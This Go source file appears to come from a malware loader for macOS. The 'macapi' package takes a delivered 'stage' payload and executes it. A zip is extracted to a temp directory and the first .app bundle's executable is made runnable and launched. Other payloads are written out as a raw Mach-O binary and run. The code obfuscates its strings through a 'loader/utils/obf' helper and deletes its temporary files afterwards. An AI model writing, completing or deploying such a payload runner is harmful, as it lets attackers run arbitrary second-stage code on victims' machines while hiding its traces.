package macapi

import (
	"archive/zip"
	"io"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"

	"golang.org/x/sys/unix"

	"loader/utils/obf"
)

// ======================
// time / sleep
// ======================

func GetTickCount() uint64 {
	// Reads the monotonic clock and returns the tick count in milliseconds
	var ts unix.Timespec
	if err := unix.ClockGettime(unix.CLOCK_MONOTONIC, &ts); err != nil {
		return 0
	}
	ms := uint64(ts.Sec)*1000 + uint64(ts.Nsec)/1_000_000
	return ms
}

func SleepMs(ms uint64) {
	// Sleeps for the given number of milliseconds
	if ms == 0 {
		return
	}
	time.Sleep(time.Duration(ms) * time.Millisecond)
}

// ======================
// stage .app
// ======================

// RunStageApp materializa e executa um stage entregue como bundle .app (zip ou Mach-O).
func RunStageApp(payload []byte) bool {
	// Receives a stage payload and runs it as an app bundle or a raw binary
	if len(payload) == 0 {
		return false
	}
	if isZipPayload(payload) {
		return runAppFromZip(payload)
	}
	return runMachO(payload)
}

func isZipPayload(payload []byte) bool {
	// Checks that the payload starts with a zip signature
	return len(payload) >= 4 && payload[0] == 'P' && payload[1] == 'K'
}

func runAppFromZip(payload []byte) bool {
	// Writes the zip payload to a temp dir, extracts it, and runs the app bundle
	tmpRoot, err := os.MkdirTemp("", obf.S("stage-app-"))
	if err != nil {
		return false
	}
	defer os.RemoveAll(tmpRoot)

	zipPath := filepath.Join(tmpRoot, obf.S("stage.zip"))
	if err := os.WriteFile(zipPath, payload, 0o600); err != nil {
		return false
	}
	if err := unzipToDir(zipPath, tmpRoot); err != nil {
		return false
	}
	appPath, ok := findAppBundle(tmpRoot)
	if !ok {
		return false
	}
	return execAppBundle(appPath)
}

func unzipToDir(zipPath, dest string) error {
	// Extracts the zip archive into the destination directory
	r, err := zip.OpenReader(zipPath)
	if err != nil {
		return err
	}
	defer r.Close()
	for _, f := range r.File {
		target := filepath.Join(dest, f.Name)
		if !strings.HasPrefix(filepath.Clean(target), filepath.Clean(dest)+string(os.PathSeparator)) {
			continue
		}
		if f.FileInfo().IsDir() {
			if err := os.MkdirAll(target, 0o755); err != nil {
				return err
			}
			continue
		}
		if err := os.MkdirAll(filepath.Dir(target), 0o755); err != nil {
			return err
		}
		rc, err := f.Open()
		if err != nil {
			return err
		}
		out, err := os.OpenFile(target, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, f.Mode())
		if err != nil {
			_ = rc.Close()
			return err
		}
		_, err = io.Copy(out, rc)
		_ = out.Close()
		_ = rc.Close()
		if err != nil {
			return err
		}
	}
	return nil
}

func findAppBundle(root string) (string, bool) {
	// Finds the first app bundle under the given root
	var found string
	_ = filepath.Walk(root, func(path string, info os.FileInfo, err error) error {
		// Checks each walked path and stores the first matching app bundle
		if err != nil || found != "" {
			return nil
		}
		if info.IsDir() && strings.HasSuffix(strings.ToLower(info.Name()), AppSuffix) {
			found = path
		}
		return nil
	})
	return found, found != ""
}

func bundleExecutable(appPath string) (string, bool) {
	// Reads the MacOS directory and returns the first executable inside it
	macosDir := filepath.Join(appPath, obf.S("Contents"), obf.S("MacOS"))
	entries, err := os.ReadDir(macosDir)
	if err != nil {
		return "", false
	}
	for _, ent := range entries {
		if ent.IsDir() || strings.HasPrefix(ent.Name(), ".") {
			continue
		}
		exe := filepath.Join(macosDir, ent.Name())
		return exe, true
	}
	return "", false
}

func execAppBundle(appPath string) bool {
	// Makes the bundle executable and runs it
	exe, ok := bundleExecutable(appPath)
	if !ok {
		return false
	}
	if err := os.Chmod(exe, 0o755); err != nil {
		return false
	}
	cmd := exec.Command(exe)
	cmd.Dir = filepath.Dir(exe)
	return cmd.Run() == nil
}

func runMachO(payload []byte) bool {
	// Writes the payload to a temp file and runs it
	f, err := os.CreateTemp("", obf.S("stage"))
	if err != nil {
		return false
	}
	path := f.Name()
	if _, err := f.Write(payload); err != nil {
		_ = f.Close()
		_ = os.Remove(path)
		return false
	}
	_ = f.Close()
	defer os.Remove(path)
	if err := os.Chmod(path, 0o755); err != nil {
		return false
	}
	cmd := exec.Command(path)
	return cmd.Run() == nil
}
